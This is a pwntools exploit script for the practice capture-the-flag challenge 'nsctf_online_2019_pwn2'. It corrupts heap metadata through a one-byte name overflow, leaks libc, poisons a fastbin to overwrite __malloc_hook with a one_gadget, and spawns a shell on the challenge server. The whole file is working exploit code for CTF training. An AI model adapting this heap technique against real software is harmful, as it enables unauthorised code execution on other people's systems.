#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/29 14:35:38
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./nsctf_online_2019_pwn2"
menu = "6.exit\n"
if context.arch == "amd64":
    # libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    # one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    libc_path = "../../libc/16-64-libc-2.23.so"
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        sh = process([file_name],env={'LD_PRELOAD':libc_path})
        # sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 29298    
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(size):
    cmd(1)
    sh.recvuntil("Input the size\n")
    sh.sendline(str(size))

def dele():
    cmd(2)

def show():
    cmd(3)

def edit_name(name):
    cmd(4)
    sh.recvuntil("Please input your name\n")
    sh.send(name)

def edit(content):
    cmd(5)
    sh.recvuntil("Input the note\n")
    sh.send(content)

sh.recvuntil("Please input your name\n")
sh.send('a'*0x30)
add(0x80)
add(0x10)
name = 'a'*0x30 +"\x10"
edit_name(name)
dele()
add(0x10)
name = 'a'*0x30 + "\x30"
edit_name(name)
show()
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
log.info("libc_base=>{}".format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
realloc = libc_base + libc.symbols['realloc']
one = libc_base + one_offset[1]
add(0x60)
dele()
# add(0x60)
add(0x10)
name = 'a'*0x30 + "\x30"

edit_name(name)
edit(p64(malloc_hook-0x23))
add(0x60)
add(0x60)
edit('\x00'*0xb+p64(one)+p64(realloc+16))
# debug()
add(0x10)
sh.interactive()
